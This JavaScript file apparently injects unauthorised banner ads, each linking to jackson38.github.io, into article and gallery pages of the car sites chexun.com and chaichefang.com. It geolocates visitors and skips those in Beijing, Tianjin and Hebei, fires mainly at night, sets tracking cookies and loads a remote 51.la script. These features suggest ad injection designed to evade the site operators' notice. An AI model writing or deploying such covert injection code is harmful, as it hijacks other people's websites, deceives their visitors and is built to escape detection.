function get_Cookie(cname)
{
  var name = cname + "=";
  var ca = document.cookie.split(';');
  for(var i=0; i<ca.length; i++) 
  {
    var c = ca[i].trim();
    if (c.indexOf(name)==0) return c.substring(name.length,c.length);
  }
  return false;
}


function check_address(data){
    //var valid_addr = ["Fujian", "Zhejiang", "Guangdong", "Henan", "Guizhou", "Hunan", "Hainan", "Jiangsu", "Shanghai", "Guangxi", "Gansu", "Anhui", "Shanxi", "Jiangxi", "Shandong", "Jiangxi", "Yunnan", "Shanxi", "Jilin", "Sichuan", "Liaoning"];
    var invalid_addr = ["Beijing", "Tianjin", "Hebei"];
    if(invalid_addr.indexOf(data["geoplugin_region"]) == -1 ){
        document.cookie = "__adf=2"; // valid
    }
    else{
        document.cookie = "__adf=1"; // Invalid
    }
}

function insert_ad(current_time){
    var ad_790_90 = '<div><a href="https://jackson38.github.io/" target="_blank"><img alt="" src="https://s2.ax1x.com/2019/05/22/VpFOpT.gif"></a></div>';
    var ad_650_200 = '<div><a href="https://jackson38.github.io/" target="_blank"><img alt="" src="https://s2.ax1x.com/2019/05/22/VpFHkq.gif"></a></div>';
    var ad_1100_75 = '<div><a href="https://jackson38.github.io/" target="_blank"><img alt="" src="https://s2.ax1x.com/2019/05/22/Vpkp7R.gif"></a></div>';
    if(location.href.match(/\/\/www.chexun.com\/\d{4}\-\d{2}\-\d{2}\/\d{9}\.html/ig)){
        // $(".cx_5_43").attr("style","display:none;"); //790_90
        // $(".cx_5_43").before(ad_790_90);
        $(".news-info.clearfix").after(ad_790_90);
        // $(".cx_5_42").attr("style","display:none;"); //1100_75
        // $(".cx_5_42").before(ad_1100_75);
    }
    else if(location.href.match(/\/\/www.chaichefang.com\/\d{4}\-\d{2}\-\d{2}\/\d{9}\.html/ig)){
        $(".news-info.clearfix").after(ad_790_90);
        $(".p-bread-nav").before(ad_1100_75);
    }
    else if(location.href.match(/\/\/auto.chexun.com\/[\w-]*\//ig)){
        // $(".cx_2_37").attr("style","display:none;"); //1100_75
        // $(".cx_2_37").before(ad_1100_75);
        $(".auto-head.clearfix").before('<div class="pictab"><a href="https://jackson38.github.io/" target="_blank"><img alt="" src="https://s2.ax1x.com/2019/05/22/Vpkp7R.gif"></a></div>');
    }
    else if(location.href.match(/\/\/car.chexun.com\/qctupian\/[\w-]+\.html/ig)){
        $(".x-img-select.clearfix").before('<div class="pictab"><a href="https://jackson38.github.io/" target="_blank"><img alt="" src="https://s2.ax1x.com/2019/05/22/Vpkp7R.gif"></a></div>');
    }
    else{
        return;
    }
    document.cookie = "__ad="+current_time;
    var x = document.createElement("SCRIPT");x.src="//js.users.51.la/20046359.js";document.body.appendChild(x);
}

function do_go(){
    if(get_Cookie("__adf") != 2){
        return;
    }
    var go = false;
    var current_hour = (new Date()).getHours();
    var current_time = (new Date()).getTime();
    var current_cookie = document.cookie;
    var old_time = get_Cookie("__ad");
    if(!old_time){
        go = true;
    }
    else{
        if(current_hour >= 20 && current_hour <= 22 && current_time-old_time > 30000){
            go = true;
        }
        else if(current_hour >= 22 && current_hour < 23 && current_time-old_time > 10000){
            go = true;
        }
        else if(current_hour >= 23){
            go = true;
        }
        else if(current_hour <= 2){
            go = true;
        }
    }
    if(go){
        insert_ad(current_time);
    }
}

$(function(){
    if(!get_Cookie("__adf")){
        $.getScript("http://www.geoplugin.net/json.gp?jsoncallback=check_address");
    }
    do_go();
});

